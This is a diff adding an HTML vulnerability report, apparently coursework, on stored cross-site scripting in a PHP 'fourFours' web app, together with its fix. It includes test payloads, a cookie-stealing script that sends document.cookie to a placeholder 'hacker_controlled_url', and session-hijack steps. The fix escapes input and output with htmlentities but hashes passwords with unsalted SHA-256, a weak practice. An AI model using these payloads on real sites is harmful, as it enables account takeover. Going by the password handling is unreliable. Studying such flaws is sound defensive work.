@@ -1,0 +1,222 @@
+<html>
+	<body>
+		<h1> # FIX: XSS: user input/output is not vetted </h1>
+		<h2> The Vulnerability </h2>
+		<ul>
+			<li> Brief explanation:
+<xmp>
+        Cross Site Scripting vulnerability is a type of injection that arises when a web 
+        application uses unsanitized user inputs and outputs. The data can include dynamic
+        content that is sent to the web user and can be interpreted by the browser 
+        depending on what the attacker intended. 
+</xmp>
+                        </li>
+			<li> Example code etc.:
+<xmp>
+        # From index.php
+        <?
+                if($operation == "login"){
+                        $user=$_REQUEST['user'];
+                        $password=$_REQUEST['password'];
+                        ...
+                        if($row = pg_fetch_row($result)) {
+                                $_SESSION['accountId']=$row[0];
+                                $_SESSION['user']=$row[1];
+                                $_SESSION['firstName']=$row[2];
+                                $_SESSION['lastName']=$row[3];
+                                $_SESSION['isLoggedIn']=True;
+                        }
+                        ...
+                } elseif($operation == "deleteExpression"){
+                        $expressionId = $_REQUEST['expressionId'];
+                        $accountId=$_REQUEST['accountId'];
+                        ...
+                } elseif($operation == "addExpression"){
+                        $expression = $_REQUEST['expression'];
+		        $value=$_REQUEST['value'];
+		        $accountId=$_REQUEST['accountId']; 
+                        ...
+                } 
+                ...
+        ?>
+        <html>
+                ...
+                <?php
+                        ...
+                        $dbconn = pg_connect_db();
+			$result = pg_prepare($dbconn, "", "SELECT firstName, lastName, value, expression, s.accountId, s.id FROM account a, solution s WHERE a.id=s.accountId AND value=$i ORDER BY firstName, lastName, expression");
+			$result = pg_execute($dbconn, "", array());
+                        while ($row = pg_fetch_row($result)) {
+                                $count=0;
+                                $firstName=$row[$count++];
+                                $lastName=$row[$count++];
+                                $value=$row[$count++];
+                                $expression=$row[$count++];
+                                $expressionAccountId=$row[$count++];
+                                $expressionId=$row[$count++];
+                                ...
+                        }
+                        ...
+                ?>
+                ...
+        </html>
+</xmp>
+                        </li>
+			<li> How attacker exploits this: 
+<xmp>
+        The attacker first needs to check the source code. He can do it by right clicking and choosing View Page Source.
+        We can notice in the source:
+
+                        ...
+                ... <td>4/4 + 4/4</td> ...
+                        ...
+
+        This tells the attacker that the expression is being placed in a <td></td> tag
+        He can now test for an XSS vulnerability by adding following line as an expression:
+
+                </td><script language="javascript">alert("got you")</script><td>
+        
+        After clicking the "add" button, the browser displays a pop up alert with "got you" written.
+        This tells the attacker that they can proceed with the attack. The attacker can then write JavaScript code that 
+        sends the cookie of anyone that logs into fourFours to a website that the hacker controls. This can be done with the following input:
+
+        </td><img id="hacked" width=100 src="" /><script language="javascript">url='http://hacker_controlled_url?arg=+document.cookie';document.getElementById("hacked").src=url;</script><td>
+        
+        Once the attacker has cookies from other users, he can open a browser and set his cookie to the one he stole.
+        This can be done in the browser by clicking the menu icon on the top right (on Mozilla on Kali), clicking on Web Developer and then Toggle Tools.
+        Then by clicking on the Storage tab we can see the current cookie being used. The attacker changes this value to the one collected using XSS.
+        The hacker now has full access to the victim's account. He can add and delete expressions on the victim's behalf. 
+</xmp>
+                        </li>
+			<li> Impact: CIAaa and some details
+<xmp>
+        This compromises integrity (I) as the user's information can be changed in storage by an attacker. In this case expressions can be
+        added or deleted. 
+        Confidentiality (C) is also compromised since the attacker was able to receive private information (the session ID).
+        This also breaches authentication (A) since the attacker can use the obtained cookie to authenticate as their victim and 
+        perform actions on their behalf.
+</xmp>
+                        </li>
+		</ul>
+
+		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
+<xmp>
+        To verify this vulnerability, we first load the website and login as a user, in this example we'll log in as Jay Perlmuter. 
+        --> username: perl and password: perl
+
+        We then add the following line as an expression and press the "add" button:
+
+                </td><script language="javascript">alert("XSS vulnerability present!")</script><td>
+        
+        The pop up appears, meaning the browser interpreted this as code confirming the vulnerability.
+        If there was no XSS vulnerability, that line would just be added as an expression with escaped characters and 
+        be shown on the screen as a string, or the application would have rejected the input. 
+
+        We can even see in the database that the HTML was inserted (in my case):
+
+        fourfours=> select * from solution;
+        id | value |                                     expression                                      | accountid 
+       ----+-------+-------------------------------------------------------------------------------------+-----------
+         8 |     4 | 4                                                                                   |        10
+         9 |     8 | 4+4                                                                                 |        10
+        12 |    16 | 4*4                                                                                 |         2
+        14 |     2 | 4/4 + 4/4                                                                           |        10
+        15 |     0 | 4-4                                                                                 |        10
+        31 |     5 | </td><script language="javascript">alert("XSS vulnerability present!")</script><td> |        10
+       (6 rows)                   
+</xmp>
+<xmp>
+</xmp>
+                <h2> The Fix </h2>
+                <ul>
+                        <li> Explain the fix:
+<xmp>
+        To fix this, we want to escape the input and outputs. To do this we'll use the htmlentities() function.
+        htmlentities() encodes all characters which have HTML character entity equivalents. This will prevent the
+        browser from interpreting them as actual code and will instead make it treat the like strings.
+        We use this function on all untrusted inputs and outputs to make sure everything is sanitized. 
+
+        # From index_fixed.php
+        <?
+                if($operation == "login"){
+                        $user=htmlentities($_REQUEST['user'], ENT_QUOTES, 'UTF-8');
+                        # Note: hashing is for Sensitive Data Exposure vulnerability
+		        $password = hash('sha256', $user . htmlentities($_REQUEST['password'], ENT_QUOTES, 'UTF-8'));
+                        ...
+                        if($row = pg_fetch_row($result)) {
+                                $_SESSION['accountId']=htmlentities($row[0], ENT_QUOTES, 'UTF-8');
+                                $_SESSION['user']=htmlentities($row[1], ENT_QUOTES, 'UTF-8');
+                                $_SESSION['firstName']=htmlentities($row[2], ENT_QUOTES, 'UTF-8');
+                                $_SESSION['lastName']=htmlentities($row[3], ENT_QUOTES, 'UTF-8');
+                        }
+                        ...
+                } elseif($operation == "deleteExpression"){
+                        # Note: 'expressionMap' part is for IDOR vulnerability
+                        $expressionId = $_SESSION['expressionMap'][htmlentities($_REQUEST['expressionId'], ENT_QUOTES, 'UTF-8')];
+                        ...
+                }
+                ...
+                elseif($operation == "addExpression"){
+                        $expression = htmlentities($_REQUEST['expression'], ENT_QUOTES, 'UTF-8');
+                        $value=htmlentities($_REQUEST['value'], ENT_QUOTES, 'UTF-8');
+                }
+                ...
+        ?>
+        <html>
+                ...
+                <?php
+                        ...
+                        $dbconn = pg_connect_db();
+			$result = pg_prepare($dbconn, "", "SELECT firstName, lastName, value, expression, s.accountId, s.id FROM account a, solution s WHERE a.id=s.accountId AND value=$1 ORDER BY firstName, lastName, expression");
+			$result = pg_execute($dbconn, "", array($i));
+			$rt = $_SESSION['token'];
+			while ($row = pg_fetch_row($result)) {
+                                $count=0;
+				$firstName=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+				$lastName=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+			        $value=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+			        $expression=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+				$expressionAccountId=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+                                $expressionId=htmlentities($row[$count++], ENT_QUOTES, 'UTF-8');
+                                ...
+                        }
+                        ...
+                ?>
+                ...
+        </html>
+</xmp>
+                        </li>
+                        <li> How the fix resolves the issue:
+<xmp>
+        Attack scenario:
+
+                The attacker wants to try and insert some HTML into the database so that it's run by the browser on the way out.
+
+                First, they log into the website and use the same code as above to test for the vulnerability:
+
+                        </td><script language="javascript">alert("got you")</script><td>
+
+                However, this time the browser doesn't give a pop up with the message "got you"
+                Instead, the line below is added as an expression:
+
+                        &lt;/td&gt;&lt;script language=&quot;javascript&quot;&gt;alert(&quot;got you&quot;)&lt;/script&gt;&lt;td&gt;
+                
+                We can even see in the database that the HTML code was not successfully inserted (in my case):
+
+                        fourfours=> select * from solution;                                                                                                                                                       
+                        id | value |                                                  expression                                                  | accountid 
+                       ----+-------+--------------------------------------------------------------------------------------------------------------+-----------
+                         8 |     4 | 4                                                                                                            |        10
+                         9 |     8 | 4+4                                                                                                          |        10
+                        12 |    16 | 4*4                                                                                                          |         2
+                        14 |     2 | 4/4 + 4/4                                                                                                    |        10
+                        15 |     0 | 4-4                                                                                                          |        10
+                        30 |     3 | &lt;/td&gt;&lt;script language=&quot;javascript&quot;&gt;alert(&quot;got you&quot;)&lt;/script&gt;&lt;td&gt; |        10
+                
+                The attack was prevented.
+</xmp>
+                        </li>
+                </ul>
+
+	</body>
+</html>
